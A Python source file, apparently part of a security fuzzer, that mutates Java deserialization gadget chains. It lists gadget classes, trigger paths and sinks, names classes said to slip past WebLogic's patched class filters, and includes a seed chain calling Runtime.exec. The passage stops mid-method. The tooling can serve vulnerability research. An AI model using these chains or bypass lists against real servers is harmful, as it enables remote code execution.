"""[DEPRECATED] Java deserialization gadget chain IR mutator.

Use DeserBinaryMutator (deser_binary_mutator.py) instead.
IR mode requires manual readObject() simulation in DeserTarget.compileRoot(),
which is fragile and produces silent false negatives. Binary mode operates
directly on serialized streams without this limitation.

Access via --mutators deser_ir (not recommended for new campaigns).

Original description:
Targets gadget chain construction differentials across Java environments:
  D1  Chain topology mutation      -> extend, truncate, splice
  D2  Type substitution (핵심)     -> type_swap, proxy_wrap, subclass_swap
  D3  Field manipulation           -> field_inject, field_null, field_type_juggle
  D4  Trigger point mutation       -> trigger_swap, collection_wrap
  D5  Sink mutation                -> sink_swap, sink_arg_mutate

Operates on an Intermediate Representation (IR) JSON describing Java gadget
chains.  Each strategy mutates the IR structurally — swapping classes along
the type hierarchy, rewiring $ref pointers, injecting proxy wrappers, and
modifying field overrides — then re-serializes to JSON bytes.
"""

from __future__ import annotations

import copy
import json
import logging
import random
from typing import TYPE_CHECKING, Any

from ..protocols import Input
from .deser_constraints import (
    cascade_from_swap,
    constraint_score,
    fix_link,
    same_interface,
    validate_chain,
)
from .deser_feedback import ExceptionHint, parse_exception, suggest_fix

if TYPE_CHECKING:
    from ..corpus import Seed

logger = logging.getLogger(__name__)

MAX_OUTPUT_SIZE = 16384

# ---------------------------------------------------------------------------
# Type hierarchy database: interface → known implementations on classpath
# ---------------------------------------------------------------------------
TYPE_HIERARCHY: dict[str, list[str]] = {
    # ── Comparators (trigger via PriorityQueue/TreeMap/TreeSet compare) ──
    "java.util.Comparator": [
        "org.apache.commons.collections4.comparators.TransformingComparator",
        "org.apache.commons.beanutils.BeanComparator",
        "org.apache.click.control.Column$ColumnComparator",  # Click2
        "java.text.RuleBasedCollator",
        "java.lang.String$CaseInsensitiveComparator",
        # WebLogic comparators
        "weblogic.jdbc.rowset.SQLComparator",
        "com.bea.core.repackaged.springframework.util.comparator.CompoundComparator",
        "com.bea.core.repackaged.springframework.util.comparator.InvertibleComparator",
        # Coherence comparator (CVE-2020-2883 bridge)
        "com.tangosol.util.comparator.ExtractorComparator",
    ],
    # ── CC3 Transformers ──
    "org.apache.commons.collections.Transformer": [
        "org.apache.commons.collections.functors.InvokerTransformer",
        "org.apache.commons.collections.functors.ChainedTransformer",
        "org.apache.commons.collections.functors.ConstantTransformer",
        "org.apache.commons.collections.functors.InstantiateTransformer",
        "org.apache.commons.collections.functors.MapTransformer",
    ],
    # ── CC4 Transformers ──
    "org.apache.commons.collections4.Transformer": [
        "org.apache.commons.collections4.functors.InvokerTransformer",
        "org.apache.commons.collections4.functors.ChainedTransformer",
        "org.apache.commons.collections4.functors.ConstantTransformer",
        "org.apache.commons.collections4.functors.InstantiateTransformer",
    ],
    # ── InvocationHandlers (proxy-based triggers) ──
    "java.lang.reflect.InvocationHandler": [
        "sun.reflect.annotation.AnnotationInvocationHandler",
        "java.beans.EventHandler",
        "bsh.XThis$Handler",  # BeanShell1/2
        # WebLogic AOP proxy (Spring-based, can chain to method invocation)
        "com.bea.core.repackaged.springframework.aop.framework.JdkDynamicAopProxy",
    ],
    # ── Map implementations ──
    "java.util.Map": [
        "java.util.HashMap",
        "java.util.Hashtable",
        "java.util.TreeMap",
        "java.util.LinkedHashMap",
        "java.util.concurrent.ConcurrentHashMap",  # CC10/CC11/ROME4/GroovyGStr
        "org.apache.commons.collections.map.LazyMap",
        "org.apache.commons.collections.map.TransformedMap",
        "org.apache.commons.collections4.map.LazyMap",
        # WildFly: alternative deser triggers (bypass PriorityQueue filters)
        "org.apache.commons.collections.bidimap.DualTreeBidiMap",
        "org.apache.commons.collections.bidimap.DualHashBidiMap",
    ],
    # ── WildFly: alternative collection triggers ──
    "org.apache.commons.collections.Bag": [
        "org.apache.commons.collections.bag.TreeBag",
    ],
    # ── ROME gadget classes (ToStringBean chain) ──
    "com.sun.syndication.feed.impl.ToStringBean": [
        "com.sun.syndication.feed.impl.ToStringBean",
    ],
    "com.sun.syndication.feed.impl.ObjectBean": [
        "com.sun.syndication.feed.impl.ObjectBean",
        "com.sun.syndication.feed.impl.EqualsBean",
    ],
    # ── Groovy closures (MethodClosure → execute) ──
    "groovy.lang.Closure": [
        "org.codehaus.groovy.runtime.MethodClosure",
        "org.codehaus.groovy.runtime.ConvertedClosure",
    ],
    "groovy.lang.GString": [
        "org.codehaus.groovy.runtime.GStringImpl",
    ],
    # ── Hibernate getter chain (TypedValue → ComponentType → getter) ──
    "org.hibernate.type.Type": [
        "org.hibernate.type.ComponentType",
    ],
    "org.hibernate.engine.spi.TypedValue": [
        "org.hibernate.engine.spi.TypedValue",
    ],
    # ── Vaadin property chain (MethodProperty → getValue → Method.invoke) ──
    "com.vaadin.data.Property": [
        "com.vaadin.data.util.MethodProperty",
        "com.vaadin.data.util.NestedMethodProperty",
        "com.vaadin.data.util.PropertysetItem",
    ],
    # ── JNDI sink objects (no TemplatesImpl needed) ──
    "javax.sql.rowset.BaseRowSet": [
        "com.sun.rowset.JdbcRowSetImpl",
    ],
    # ── TemplatesImpl (bytecode loading sink) ──
    "javax.xml.transform.Templates": [
        "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
        # WildFly shaded Xalan — bypasses JPMS on JDK 17/21
        "org.eclipse.tags.shaded.org.apache.xalan.xsltc.trax.TemplatesImpl",
    ],
    # ── BeanShell interpreter ──
    "bsh.Interpreter": [
        "bsh.Interpreter",
    ],
    # ── WebLogic-specific: second-order deser wrappers (ClassFilter bypass) ──
    "weblogic.corba.utils.MarshalledObject": [
        "weblogic.corba.utils.MarshalledObject",
    ],
    # ── WebLogic-specific: BEA repackaged Spring JNDI sink ──
    "com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager": [
        "com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager",
    ],
    # ── WebLogic-specific: OpaqueReference (getReferent → JNDI lookup) ──
    "weblogic.jndi.OpaqueReference": [
        "weblogic.jndi.internal.ForeignOpaqueReference",
    ],
    # ── WebLogic-specific: BEA Spring InvocationHandler (AOP proxy) ──
    "weblogic.aop.InvocationHandler": [
        "com.bea.core.repackaged.springframework.aop.framework.JdkDynamicAopProxy",
    ],
    # ── WebLogic-specific: Comparators ──
    "weblogic.Comparator": [
        "weblogic.jdbc.rowset.SQLComparator",
        "com.bea.core.repackaged.springframework.util.comparator.BooleanComparator",
        "com.bea.core.repackaged.springframework.util.comparator.CompoundComparator",
        "com.bea.core.repackaged.springframework.util.comparator.InvertibleComparator",
    ],
    # ── WebLogic-specific: readResolve classes (potential 2nd-order triggers) ──
    "weblogic.ReadResolve": [
        "weblogic.iiop.ProxyDesc",
        "weblogic.management.internal.WebLogicAttribute$NullObject",
        "com.bea.core.repackaged.springframework.aop.target.EmptyTargetSource",
        "com.bea.core.repackaged.springframework.aop.interceptor.ExposeInvocationInterceptor",
    ],
    # ── WebLogic-specific: JNDI-related (readObject with JNDI fields) ──
    "weblogic.JndiSink": [
        "weblogic.wsee.jaxws.buffer.BufferingConfig$Queue",
    ],
    # ── Coherence ValueExtractor hierarchy (CVE-2020-2555/2883/2021-2394) ──
    # Analog of CC's Transformer — extract() calls Method.invoke()
    "com.tangosol.util.ValueExtractor": [
        "com.tangosol.util.extractor.ReflectionExtractor",   # extract() → Method.invoke()
        "com.tangosol.util.extractor.ChainedExtractor",      # sequential extract() chain
        "com.tangosol.util.extractor.MultiExtractor",        # parallel extract()
        "com.tangosol.util.extractor.UniversalExtractor",    # getMethod/invoke (post-2555 patch)
        "com.tangosol.util.extractor.ComparisonValueExtractor",
        "com.tangosol.util.extractor.ScriptValueExtractor",  # Nashorn script eval
        # ── Post-PSU allowed reporter extractors (NOT extending AbstractExtractor) ──
        "com.tangosol.coherence.reporter.extractor.AttributeExtractor",
        "com.tangosol.coherence.reporter.extractor.SubQueryExtractor",
        "com.tangosol.coherence.reporter.extractor.KeyExtractor",
        "com.tangosol.coherence.reporter.extractor.ConstantExtractor",
        "com.tangosol.coherence.reporter.extractor.DeltaExtractor",
        "com.tangosol.coherence.reporter.extractor.AggregateExtractor",
        "com.tangosol.coherence.reporter.extractor.OperationExtractor",
        "com.tangosol.coherence.reporter.extractor.CorrelatedExtractor",
        "com.tangosol.coherence.transaction.internal.ValuesKeyExtractor",
        "com.tangosol.coherence.rest.util.PropertySet",
    ],
    # ── Coherence comparator bridge (compare → extract) ──
    "com.tangosol.util.comparator": [
        "com.tangosol.util.comparator.ExtractorComparator",  # compare(o1,o2) → extract(o1)
        # Post-PSU allowed comparator wrappers (delegate to inner comparator)
        "com.tangosol.util.comparator.ChainedComparator",
        "com.tangosol.util.comparator.SafeComparator",
        "com.tangosol.util.comparator.InverseComparator",
        "com.tangosol.util.comparator.EntryComparator",
        "com.tangosol.coherence.transaction.internal.ComparatorWrapper",
    ],
    # ── Coherence filter (toString trigger for CVE-2020-2555) ──
    "com.tangosol.util.filter": [
        "com.tangosol.util.filter.LimitFilter",              # toString() → extract()
    ],
    # ── Coherence aggregator (CVE-2020-14645 analog) ──
    "com.tangosol.util.aggregator": [
        "com.tangosol.util.aggregator.TopNAggregator",       # compare() dispatch
    ],
    # ── BEA Spring AdvisedSupport (readObject with JNDI-relevant fields) ──
    "com.bea.core.repackaged.springframework.aop": [
        "com.bea.core.repackaged.springframework.aop.framework.AdvisedSupport",
    ],
}

# ── IOCD type hierarchy expansion ──
# Merge discovered types from IOCD static analysis if available.
def _load_iocd_type_hierarchy() -> None:
    """Load type hierarchy discovered by IOCD static analyzer."""
    import os, json
    iocd_file = os.path.join(
        os.path.dirname(__file__), "..", "..", "..",
        "targets", "deser_seeds", "iocd", "_type_hierarchy.json"
    )
    if not os.path.exists(iocd_file):
        return
    try:
        with open(iocd_file) as f:
            discovered = json.load(f)
        added = 0
        for iface, impls in discovered.items():
            if iface not in TYPE_HIERARCHY:
                TYPE_HIERARCHY[iface] = list(impls)
                added += len(impls)
            else:
                existing = set(TYPE_HIERARCHY[iface])
                for c in impls:
                    if c not in existing:
                        TYPE_HIERARCHY[iface].append(c)
                        added += 1
        if added > 0:
            import logging
            logging.getLogger(__name__).info("IOCD: merged %d new type mappings", added)
    except Exception:
        pass

_load_iocd_type_hierarchy()

# Reverse index: class → list of interfaces it implements
_CLASS_TO_INTERFACES: dict[str, list[str]] = {}
for _iface, _impls in TYPE_HIERARCHY.items():
    for _cls in _impls:
        _CLASS_TO_INTERFACES.setdefault(_cls, []).append(_iface)

# All known classes across the hierarchy (flat set for random selection)
_ALL_CLASSES: list[str] = sorted(
    {cls for impls in TYPE_HIERARCHY.values() for cls in impls}
)

# Non-CC classes for CC escape mutations
_NON_CC_CLASSES: list[str] = [
    c for c in _ALL_CLASSES
    if not ("commons.collections" in c and "functors" in c)
]

# WebLogic/BEA priority classes for targeted exploration.
# When escaping CC chains, prefer these classes to find novel WebLogic gadgets.
_WL_PRIORITY_CLASSES: list[str] = [
    c for c in _ALL_CLASSES
    if any(prefix in c for prefix in (
        "weblogic.", "com.bea.core.repackaged.springframework.",
        "com.sun.rowset.", "javax.xml.transform.",  # common sinks
    ))
]

# Post-PSU allowed classes: verified to pass WL 14.1.1.0 ClassFilter after
# July+Oct 2020 CPU patches.  Used by _type_swap when --filter=weblogic mode.
# Key: reporter extractors don't extend AbstractExtractor → pass denylist.
_WL_PSU_ALLOWED: list[str] = [
    # Coherence reporter ValueExtractors (not blocked — no AbstractExtractor in hierarchy)
    "com.tangosol.coherence.reporter.extractor.AttributeExtractor",
    "com.tangosol.coherence.reporter.extractor.SubQueryExtractor",
    "com.tangosol.coherence.reporter.extractor.KeyExtractor",
    "com.tangosol.coherence.reporter.extractor.ConstantExtractor",
    "com.tangosol.coherence.reporter.extractor.DeltaExtractor",
    "com.tangosol.coherence.reporter.extractor.AggregateExtractor",
    "com.tangosol.coherence.reporter.extractor.OperationExtractor",
    "com.tangosol.coherence.reporter.extractor.CorrelatedExtractor",
    "com.tangosol.coherence.transaction.internal.ValuesKeyExtractor",
    # Coherence comparators (all allowed post-PSU)
    "com.tangosol.util.comparator.ExtractorComparator",
    "com.tangosol.util.comparator.ChainedComparator",
    "com.tangosol.util.comparator.SafeComparator",
    "com.tangosol.util.comparator.InverseComparator",
    "com.tangosol.util.comparator.EntryComparator",
    "com.tangosol.coherence.transaction.internal.ComparatorWrapper",
    # BEA Spring comparators (allowed)
    "com.bea.core.repackaged.springframework.util.comparator.CompoundComparator",
    "com.bea.core.repackaged.springframework.util.comparator.InvertibleComparator",
    "com.bea.core.repackaged.springframework.util.comparator.BooleanComparator",
    # BEA Spring AOP (allowed, readObject + JNDI fields)
    "com.bea.core.repackaged.springframework.aop.framework.AdvisedSupport",
    "com.bea.core.repackaged.springframework.aop.framework.JdkDynamicAopProxy",
    # WL native (allowed)
    "weblogic.jdbc.rowset.SQLComparator",
    # JDK sinks (always allowed)
    "com.sun.rowset.JdbcRowSetImpl",
    "sun.reflect.annotation.AnnotationInvocationHandler",
]

# ---------------------------------------------------------------------------
# Root trigger database: root class → deserialization trigger path
# ---------------------------------------------------------------------------
ROOT_TRIGGERS: dict[str, str] = {
    # Classic entry points (often filtered by JEP 290)
    "java.util.HashMap": "readObject→hash→hashCode",
    "java.util.PriorityQueue": "readObject→heapify→comparator.compare",
    "java.util.TreeMap": "readObject→put→comparator.compare",
    "java.util.Hashtable": "readObject→reconstitutionPut→hashCode",
    "java.util.HashSet": "readObject→HashMap.put→hashCode",
    "java.util.LinkedHashSet": "readObject→HashMap.put→hashCode",
    # Filter-bypass entry points (rarely blocked)
    "java.util.concurrent.ConcurrentHashMap": "readObject→putVal→hashCode",
    "java.util.TreeSet": "readObject→TreeMap.put→comparator.compare",
    "org.apache.commons.collections4.bag.TreeBag": "readObject→TreeMap.put→comparator.compare",
    "javax.management.BadAttributeValueExpException": "readObject→val.toString",
}

_ROOT_CLASSES: list[str] = list(ROOT_TRIGGERS.keys())

# ---------------------------------------------------------------------------
# Sink methods and dangerous method names
# ---------------------------------------------------------------------------
SINK_METHODS: list[str] = [
    "Runtime.exec", "ProcessBuilder.start", "Method.invoke",
    "InitialContext.lookup", "InitialContext.doLookup",
    "JdbcRowSetImpl.getDatabaseMetaData", "JdbcRowSetImpl.connect",
    "URL.openConnection", "FileOutputStream.write",
    "ClassLoader.loadClass", "ScriptEngine.eval", "Thread.start",
    "TemplatesImpl.getOutputProperties", "TemplatesImpl.newTransformer",
    # Coherence sinks
    "ReflectionExtractor.extract", "ChainedExtractor.extract",
    "UniversalExtractor.extract", "ScriptValueExtractor.extract",
]

DANGEROUS_METHOD_NAMES: list[str] = [
    "exec", "start", "invoke", "lookup", "doLookup", "eval",
    "loadClass", "defineClass", "newInstance", "forName",
    "getMethod", "getDeclaredMethod", "getRuntime",
    "openConnection", "connect", "write",
    "getOutputProperties", "newTransformer", "getDatabaseMetaData",
    "execute", "toString", "hashCode", "getValue",
    # Coherence
    "extract", "createExtractor",
]

# ---------------------------------------------------------------------------
# Strategy weights
# ---------------------------------------------------------------------------
_STRATEGY_DEFS: list[tuple[str, float]] = [
    # D1: Chain topology
    ("chain_extend",      0.12),
    ("chain_truncate",    0.05),
    ("chain_splice",      0.08),
    # D2: Type substitution
    ("type_swap",         0.20),
    ("proxy_wrap",        0.08),
    ("subclass_swap",     0.05),
    # D3: Field manipulation
    ("field_inject",      0.10),
    ("field_null",        0.03),
    ("field_type_juggle", 0.04),
    # D4: Trigger point mutation
    ("trigger_swap",      0.08),
    ("collection_wrap",   0.05),
    # D5: Sink mutation
    ("sink_swap",         0.07),
    ("sink_arg_mutate",   0.05),
    # D6: Constraint repair (IOCD-lite)
    ("constraint_fix",    0.08),
    # D7: Exception-guided mutation (JDD feedback loop)
    ("exception_guided",  0.15),
]

# ---------------------------------------------------------------------------
# Minimal valid IR (fallback when JSON parse fails)
# ---------------------------------------------------------------------------
_MINIMAL_IR: dict[str, Any] = {
    "chain_type": "transform_chain",
    "root_class": "java.util.PriorityQueue",
    "root_trigger": "readObject→heapify→comparator.compare",
    "links": [
        {
            "class": "org.apache.commons.collections4.comparators.TransformingComparator",
            "field_overrides": {
                "transformer": {"$ref": "link:1"},
            },
        },
        {
            "class": "org.apache.commons.collections4.functors.InvokerTransformer",
            "field_overrides": {
                "iMethodName": "exec",
                "iParamTypes": ["[Ljava.lang.String;"],
                "iArgs": [["id"]],
            },
        },
    ],
    "sink_method": "Runtime.exec",
}


def _parse_ir(data: bytes) -> dict[str, Any] | None:
    """Parse IR JSON from bytes, returning None on failure."""
    try:
        obj = json.loads(data)
        if isinstance(obj, dict) and "links" in obj and isinstance(obj["links"], list):
            return obj
    except (json.JSONDecodeError, UnicodeDecodeError, ValueError, RecursionError):
        pass
    return None


def _serialize_ir(ir: dict[str, Any]) -> bytes:
    """Serialize IR dict to compact JSON bytes."""
    return json.dumps(ir, separators=(",", ":"), ensure_ascii=True).encode("utf-8")


class DeserMutator:
    """Java deserialization gadget chain IR mutator."""

    name = "deser"

    # Exploration-heavy strategies — boosted as fuzzing stalls over time.
    _EXPLORATION_STRATEGIES: set[str] = {
        "chain_extend", "chain_splice", "type_swap", "sink_swap",
        "trigger_swap", "collection_wrap", "proxy_wrap",
    }

    def __init__(self, seed: int | None = None) -> None:
        self.rng = random.Random(seed)

        self._strategy_names: list[str] = [name for name, _ in _STRATEGY_DEFS]
        self._strategy_methods = [
            getattr(self, f"_{name}") for name, _ in _STRATEGY_DEFS
        ]
        # Convert fractional weights to integer-friendly values (multiply by 100)
        self._base_weights: list[int] = [
            max(1, int(w * 100)) for _, w in _STRATEGY_DEFS
        ]
        self._weights: list[int] = list(self._base_weights)
        self._strategy_finds: list[int] = [0] * len(self._strategy_methods)
        self._strategy_cov: list[int] = [0] * len(self._strategy_methods)
        self._total_feedback_calls: int = 0
        self._last_exception_hint: ExceptionHint | None = None
        # Progressive exploration shift — tracks cumulative stall resets
        # to gradually boost exploration-heavy strategies.
        self._exploration_boost_level: int = 0

    # ------------------------------------------------------------------
    # Mutator protocol
    # ------------------------------------------------------------------

    def mutate(self, inp: Input, corpus: list[Seed]) -> Input:
        ir = _parse_ir(inp.data)
        if ir is None:
            ir = copy.deepcopy(_MINIMAL_IR)

        applied: list[str] = []

        # Apply 1-3 stacked strategies
        n_mutations = self.rng.choices([1, 2, 3], weights=[50, 35, 15], k=1)[0]
        for _ in range(n_mutations):
            idx = self.rng.choices(
                range(len(self._strategy_methods)),
                weights=self._weights,
                k=1,
            )[0]
            result = self._strategy_methods[idx](ir, corpus)
            if result is not None:
                out = _serialize_ir(result)
                if len(out) <= MAX_OUTPUT_SIZE:
                    ir = result
                    applied.append(self._strategy_names[idx])
                    continue

            # Fallback: pick a different random strategy
            fallback_idx = self.rng.randrange(len(self._strategy_methods))
            result = self._strategy_methods[fallback_idx](ir, corpus)
            if result is not None:
                out = _serialize_ir(result)
                if len(out) <= MAX_OUTPUT_SIZE:
                    ir = result
                    applied.append(self._strategy_names[fallback_idx])

        data = _serialize_ir(ir)
        return Input(
            data=data[:MAX_OUTPUT_SIZE],
            metadata={
                **inp.metadata,
                "mutator": self.name,
                "strategies": applied,
                "constraint_score": constraint_score(ir),
            },
        )

    # ------------------------------------------------------------------
    # Adaptive weight tuning (called by engine via coverage feedback)
    # ------------------------------------------------------------------

    def feedback(self, strategy_name: str, signal: str) -> None:
        """Receive feedback from engine about strategy effectiveness.

        Args:
            strategy_name: Name of the strategy that produced the result.
            signal: "finding", "stage_up", or "coverage".
        """
        try:
            idx = self._strategy_names.index(strategy_name)
        except ValueError:
            return

        self._total_feedback_calls += 1

        if signal == "finding":
            self._strategy_finds[idx] += 1
            self._weights[idx] = min(
                self._weights[idx] + max(self._base_weights[idx] // 4, 1),
                self._base_weights[idx] * 3,
            )
        elif signal == "stage_up":
            self._strategy_cov[idx] += 1
            self._weights[idx] = min(
                self._weights[idx] + max(self._base_weights[idx] * 15 // 100, 1),
                self._base_weights[idx] * 3,
            )
        elif signal == "coverage":
            self._strategy_cov[idx] += 1
            self._weights[idx] = min(
                self._weights[idx] + max(self._base_weights[idx] // 10, 1),
                self._base_weights[idx] * 3,
            )

        if self._total_feedback_calls % 1000 == 0:
            for i in range(len(self._strategy_methods)):
                if self._strategy_finds[i] == 0 and self._strategy_cov[i] == 0:
                    self._weights[i] = max(self._weights[i] - 1, 1)

    def reset_weights(self, boost_zero_finds: bool = False) -> None:
        """Reset dynamic weights — called by engine on stall detection.

        Progressive exploration shift: each stall reset increases the
        exploration boost level, gradually shifting weight from refinement
        strategies (field_inject, field_null, sink_arg_mutate) toward
        exploration strategies (chain_extend, chain_splice, type_swap,
        sink_swap, trigger_swap).  This prevents the fuzzer from getting
        stuck mutating the same chain patterns.

        Boost schedule (per exploration strategy, cumulative):
          Level 0: base weights (no boost)
          Level 1: +25% exploration, -10% refinement
          Level 2: +50% exploration, -20% refinement
          Level 3: +75% exploration, -25% refinement  (cap)
        """
        self._exploration_boost_level = min(
            self._exploration_boost_level + 1, 3
        )
        level = self._exploration_boost_level
        for i, name in enumerate(self._strategy_names):
            base = self._base_weights[i]
            if name in self._EXPLORATION_STRATEGIES:
                # Boost exploration strategies progressively
                boost = base * level * 25 // 100
                self._weights[i] = base + boost
            else:
                # Reduce refinement strategies slightly
                reduction = base * level * 10 // 100
                self._weights[i] = max(base - reduction, 1)

        # Additionally boost zero-find strategies (original behavior)
        if boost_zero_finds:
            for i in range(len(self._strategy_methods)):
                if self._strategy_finds[i] == 0:
                    self._weights[i] = min(
                        self._weights[i] + max(self._base_weights[i] // 3, 1),
                        self._base_weights[i] * 3,
                    )

    # ------------------------------------------------------------------
    # Helper: resolve working IR from input
    # ------------------------------------------------------------------

    def _get_ir(self, ir: dict[str, Any]) -> dict[str, Any]:
        """Return a deep copy of the IR for mutation."""
        return copy.deepcopy(ir)

    def _pick_link_idx(self, links: list[dict[str, Any]]) -> int | None:
        """Pick a random link index, or None if links is empty."""
        if not links:
            return None
        return self.rng.randrange(len(links))

    def _rewire_refs(self, links: list[dict[str, Any]], removed_idx: int) -> None:
        """After removing a link at `removed_idx`, fix all $ref pointers."""
        for link in links:
            overrides = link.get("field_overrides", {})
            for key, val in list(overrides.items()):
                if isinstance(val, dict) and "$ref" in val:
                    ref_str = val["$ref"]
                    if ref_str.startswith("link:"):
                        try:
                            ref_idx = int(ref_str.split(":")[1])
                        except (ValueError, IndexError):
                            continue
                        if ref_idx == removed_idx:
                            # Point to the nearest valid link
                            new_idx = min(removed_idx, len(links) - 1)
                            if new_idx < 0:
                                del overrides[key]
                            else:
                                val["$ref"] = f"link:{new_idx}"
                        elif ref_idx > removed_idx:
                            val["$ref"] = f"link:{ref_idx - 1}"

    def _shift_refs_up(self, links: list[dict[str, Any]], inserted_idx: int) -> None:
        """After inserting a link at `inserted_idx`, shift $ref pointers up."""
        for link in links:
            overrides = link.get("field_overrides", {})
            for key, val in list(overrides.items()):
                if isinstance(val, dict) and "$ref" in val:
                    ref_str = val["$ref"]
                    if ref_str.startswith("link:"):
                        try:
                            ref_idx = int(ref_str.split(":")[1])
                        except (ValueError, IndexError):
                            continue
                        if ref_idx >= inserted_idx:
                            val["$ref"] = f"link:{ref_idx + 1}"

    # ------------------------------------------------------------------
    # D1: Chain topology strategies
    # ------------------------------------------------------------------

    def _chain_extend(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Add a new link to the chain from the type hierarchy."""
        out = self._get_ir(ir)
        links = out.get("links", [])
        if len(links) >= 20:
            return None  # prevent explosion

        # Pick a random class from the hierarchy
        new_class = self.rng.choice(_ALL_CLASSES)
        insert_idx = self.rng.randint(0, len(links))

        # Shift existing refs
        self._shift_refs_up(links, insert_idx)

        new_link: dict[str, Any] = {
            "class": new_class,
            "field_overrides": {},
        }

        # Wire to next link if not at end
        if insert_idx < len(links):
            new_link["field_overrides"]["target"] = {"$ref": f"link:{insert_idx + 1}"}
        elif links:
            # At end — wire to previous
            new_link["field_overrides"]["source"] = {"$ref": f"link:{insert_idx - 1}"}

        links.insert(insert_idx, new_link)
        out["links"] = links
        return out

    def _chain_truncate(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Remove a random non-essential link and rewire $ref pointers."""
        out = self._get_ir(ir)
        links = out.get("links", [])
        if len(links) <= 1:
            return None  # must keep at least one link

        remove_idx = self.rng.randrange(len(links))
        links.pop(remove_idx)
        self._rewire_refs(links, remove_idx)
        out["links"] = links
        return out

    def _chain_splice(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Splice a link from a corpus entry's chain into the current chain."""
        if not corpus:
            return None

        donor_seed = self.rng.choice(corpus)
        donor_ir = _parse_ir(donor_seed.input.data)
        if donor_ir is None or not donor_ir.get("links"):
            return None

        out = self._get_ir(ir)
        links = out.get("links", [])
        if len(links) >= 20:
            return None

        donor_link = copy.deepcopy(self.rng.choice(donor_ir["links"]))
        # Clear stale refs from donor
        overrides = donor_link.get("field_overrides", {})
        for key, val in list(overrides.items()):
            if isinstance(val, dict) and "$ref" in val:
                del overrides[key]

        insert_idx = self.rng.randint(0, len(links))
        self._shift_refs_up(links, insert_idx)

        # Wire donor to next link if possible
        if insert_idx < len(links):
            donor_link.setdefault("field_overrides", {})["target"] = {
                "$ref": f"link:{insert_idx + 1}"
            }

        links.insert(insert_idx, donor_link)
        out["links"] = links
        return out

    # ------------------------------------------------------------------
    # D2: Type substitution strategies
    # ------------------------------------------------------------------

    def _type_swap(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Swap a link's class for another implementing the same interface.

        When the current chain is a known CC pattern, prefer swapping TO
        non-CC classes (WebLogic, BEA Spring, etc.) to explore novel chains
        instead of producing more CC variants.
        """
        out = self._get_ir(ir)
        links = out.get("links", [])
        idx = self._pick_link_idx(links)
        if idx is None:
            return None

        current_class = links[idx].get("class", "")
        interfaces = _CLASS_TO_INTERFACES.get(current_class, [])
        if not interfaces:
            # Unknown class — pick any random swap
            links[idx]["class"] = self.rng.choice(_ALL_CLASSES)
            return out

        # Pick an interface, then a different implementation
        iface = self.rng.choice(interfaces)
        candidates = [c for c in TYPE_HIERARCHY[iface] if c != current_class]
        if not candidates:
            return None

        # When chain is CC-heavy, escape the CC ecosystem entirely.
        # Replace ALL CC functor links with random non-CC classes to force
        # exploration of novel chain structures (WebLogic, BEA Spring, etc.)
        if self._is_cc_heavy(links) and self.rng.random() < 0.5:
            pool = _WL_PRIORITY_CLASSES if _WL_PRIORITY_CLASSES else _NON_CC_CLASSES
            if pool:
                for i, link in enumerate(links):
                    if self._is_cc_class(link.get("class", "")):
                        links[i]["class"] = self.rng.choice(pool)
                        links[i]["field_overrides"] = {}
                return out

        # When chain contains PSU-blocked classes (AbstractExtractor descendants,
        # ReflectionExtractor, ChainedExtractor, UniversalExtractor, etc.),
        # replace them with PSU-allowed alternatives from reporter package.
        if self._has_psu_blocked(links) and self.rng.random() < 0.6:
            if _WL_PSU_ALLOWED:
                for i, link in enumerate(links):
                    if self._is_psu_blocked_class(link.get("class", "")):
                        links[i]["class"] = self.rng.choice(_WL_PSU_ALLOWED)
                        links[i]["field_overrides"] = {}
                return out

        new_class = self.rng.choice(candidates)
        links[idx] = cascade_from_swap(
            current_class, new_class, links[idx], links, idx, self.rng,
        )
        return out

    @staticmethod
    def _is_cc_class(class_name: str) -> bool:
        """Check if a class is a standard Commons Collections gadget."""
        return (
            "commons.collections" in class_name
            and "functors" in class_name
        )

    @staticmethod
    def _is_cc_heavy(links: list[dict[str, Any]]) -> bool:
        """Check if the chain is dominated by CC transformer classes."""
        cc_count = 0
        for link in links:
            cls = link.get("class", "")
            if "commons.collections" in cls and "functors" in cls:
                cc_count += 1
        return cc_count >= 2

    # Post-PSU blocked classes: AbstractExtractor descendants + explicitly listed
    _PSU_BLOCKED_PREFIXES = (
        "com.tangosol.util.extractor.ReflectionExtractor",
        "com.tangosol.util.extractor.ChainedExtractor",
        "com.tangosol.util.extractor.UniversalExtractor",
        "com.tangosol.util.extractor.MultiExtractor",
        "com.tangosol.util.extractor.AbstractExtractor",
        "com.tangosol.util.extractor.ComparisonValueExtractor",
        "com.tangosol.util.extractor.ScriptValueExtractor",
        "com.tangosol.util.filter.LimitFilter",
        "com.tangosol.internal.util.SimpleBinaryEntry",
        "weblogic.corba.utils.MarshalledObject",
        "weblogic.jndi.internal.ForeignOpaqueReference",
    )

    @classmethod
    def _is_psu_blocked_class(cls, class_name: str) -> bool:
        """Check if a class is blocked by post-PSU ClassFilter."""
        return class_name in cls._PSU_BLOCKED_PREFIXES

    @classmethod
    def _has_psu_blocked(cls, links: list[dict[str, Any]]) -> bool:
        """Check if any link uses a PSU-blocked class."""
        return any(cls._is_psu_blocked_class(l.get("class", "")) for l in links)

    def _proxy_wrap(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Wrap a link in a dynamic proxy (InvocationHandler)."""
        out = self._get_ir(ir)
        links = out.get("links", [])
        if not links or len(links) >= 20:
            return None

        wrap_idx = self.rng.randrange(len(links))

        handler_class = self.rng.choice(
            TYPE_HIERARCHY["java.lang.reflect.InvocationHandler"]
        )

        # Shift refs up to make room
        self._shift_refs_up(links, wrap_idx)

        proxy_link: dict[str, Any] = {
            "class": handler_class,
            "field_overrides": {
                "target": {"$ref": f"link:{wrap_idx + 1}"},
                "action": self.rng.choice(DANGEROUS_METHOD_NAMES),
            },
        }

        links.insert(wrap_idx, proxy_link)
        out["links"] = links
        return out

    def _subclass_swap(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Swap to another class from the same TYPE_HIERARCHY family."""
        out = self._get_ir(ir)
        links = out.get("links", [])
        idx = self._pick_link_idx(links)
        if idx is None:
            return None

